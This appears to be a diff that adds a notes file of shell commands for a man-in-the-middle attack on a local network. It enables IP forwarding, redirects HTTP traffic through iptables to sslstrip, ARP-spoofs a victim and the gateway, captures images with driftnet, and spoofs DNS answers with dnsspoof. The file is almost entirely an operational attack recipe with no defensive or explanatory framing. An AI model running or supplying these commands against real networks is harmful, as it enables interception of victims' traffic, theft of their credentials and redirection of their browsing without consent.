@@ -1,0 +1,27 @@
+# locate sslstrip | grep README
+
+# cat /usr/share/doc/sslstrip/README
+
+# cat /proc/sys/net/ipv4/ip_forward
+
+# echo "1" > /proc/sys/net/ipv4/ip_forward
+
+# cat /proc/sys/net/ipv4/ip_forward
+
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+# sslstrip -a
+
+# <open a new terminal>
+
+arpspoof -i eth0 -t <victim ip> <gateway ip>
+
+# <open a new terminal
+
+arpspoof -i eth0 -t <gateway ip> <victim ip>
+
+for driftnet,
+
+driftnet -v -i eth0
+
+dnsspoof -f /root/Desktop/host.txt -i eth0 host <targetip> and udp port 53
